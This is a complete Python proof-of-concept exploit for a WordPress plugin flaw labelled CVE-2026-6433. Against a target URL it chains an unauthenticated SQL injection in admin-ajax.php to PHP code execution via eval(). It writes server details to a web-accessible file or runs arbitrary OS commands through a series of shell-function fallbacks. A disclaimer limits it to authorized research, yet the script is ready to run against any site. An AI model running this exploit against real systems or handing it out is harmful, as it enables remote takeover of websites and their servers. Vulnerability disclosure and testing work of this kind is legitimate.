#!/usr/bin/env python3
"""
CVE-2026-6433 PoC: FlipperCode Custom CSS, JS & PHP <= 2.0.7
Unauthenticated SQL Injection chained to Remote Code Execution via eval().

Discovered by: Dr. John Umoru, ClarenSec Limited.

Usage:
    python3 exploit.py https://target.com --php-only --no-cleanup
    python3 exploit.py https://target.com --cleanup-only
    python3 exploit.py https://target.com --command "id"

DISCLAIMER
----------
This proof-of-concept is provided for educational and defensive research
purposes only. Use only against systems you own or have explicit written
authorization to test. The author accepts no responsibility for misuse.
"""
import sys
import re
import time
import urllib.request
import urllib.parse
import urllib.error
import ssl
import argparse


def req(url, data=None):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    if data and isinstance(data, dict):
        data = urllib.parse.urlencode(data).encode()
    r = urllib.request.Request(url, data=data, method='POST' if data else 'GET')
    try:
        resp = urllib.request.urlopen(r, context=ctx, timeout=15)
        return resp.status, resp.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as e:
        body = e.read().decode('utf-8', 'replace') if hasattr(e, 'read') else ''
        return e.code, body
    except Exception as e:
        return 0, str(e)


def inject(ajax_url, php_code):
    php_hex = '0x' + php_code.encode().hex()
    sqli = f"0 UNION SELECT 1,'t','php',{php_hex},'header','',0,1-- "
    return req(ajax_url, {
        'action': 'fc_ajax_call',
        'operation': 'wce_editor_inline_code',
        'id': sqli,
    })


def main():
    p = argparse.ArgumentParser(
        description='FlipperCode Custom CSS JS PHP: Unauthenticated SQLi to RCE',
        epilog='Discovered by Dr. John Umoru, ClarenSec Limited'
    )
    p.add_argument('target', help='Target WordPress URL')
    p.add_argument('--command', default=None, help='OS command to execute (requires shell_exec)')
    p.add_argument('--php-only', action='store_true', help='Pure PHP proof (works on shared hosting)')
    p.add_argument('--no-cleanup', action='store_true', help='Keep proof file on disk')
    p.add_argument('--proof-name', default='rce-proof.txt', help='Proof filename (default: rce-proof.txt)')
    p.add_argument('--cleanup-only', action='store_true', help='Remove proof file and exit')
    args = p.parse_args()

    base = args.target.rstrip('/')
    ajax = f"{base}/wp-admin/admin-ajax.php"
    proof_name = args.proof_name
    proof_url = f"{base}/{proof_name}"

    # Cleanup mode
    if args.cleanup_only:
        inject(ajax, "<?php @unlink($_SERVER['DOCUMENT_ROOT'].'/"+proof_name+"'); ?>")
        time.sleep(1)
        c, _ = req(proof_url)
        print(f"{'Removed' if c == 404 else 'Still exists'}: {proof_url}")
        sys.exit(0)

    # Verify target
    code, body = req(ajax, {'action': 'fc_ajax_call', 'operation': 'processor'})
    if 'flippercode' not in body.lower() and 'custom css' not in body.lower():
        print(f"FAIL: plugin not active or handler blocked (HTTP {code})")
        sys.exit(1)

    # Build payload
    if args.php_only or args.command is None:
        php = (
            '<?php '
            '$p = "CVE-2026-6433 RCE proof\\n\\n";'
            '$p .= php_uname() . "\\n" . get_current_user() . "\\n" . phpversion();'
            'file_put_contents($_SERVER["DOCUMENT_ROOT"] . "/' + proof_name + '", $p);'
            ' ?>'
        )
    else:
        cmd = args.command.replace('"', '\\"')
        php = (
            '<?php '
            '$o = "";'
            'if(function_exists("shell_exec")){$o=shell_exec("' + cmd + '");}'
            'elseif(function_exists("exec")){exec("' + cmd + '",$r);$o=implode("\\n",$r);}'
            'elseif(function_exists("system")){ob_start();system("' + cmd + '");$o=ob_get_clean();}'
            'elseif(function_exists("passthru")){ob_start();passthru("' + cmd + '");$o=ob_get_clean();}'
            'elseif(function_exists("popen")){$h=popen("' + cmd + '","r");$o=fread($h,65536);pclose($h);}'
            'else{$o="All command execution functions disabled. Use --php-only instead.";}'
            'file_put_contents($_SERVER["DOCUMENT_ROOT"] . "/' + proof_name + '", $o);'
            ' ?>'
        )

    # Send payload
    code, _ = inject(ajax, php)
    if code not in (200, 500):
        print(f"FAIL: payload delivery returned HTTP {code}")
        sys.exit(1)

    # Read proof
    time.sleep(1)
    code, body = req(proof_url)
    if code != 200 or not body.strip():
        print(f"FAIL: proof file not found at {proof_url}")
        sys.exit(1)

    if args.command:
        print(body.strip())
    else:
        print(proof_url)

    # Cleanup unless told not to
    if not args.no_cleanup:
        inject(ajax, "<?php @unlink($_SERVER['DOCUMENT_ROOT'].'/"+proof_name+"'); ?>")


if __name__ == '__main__':
    main()
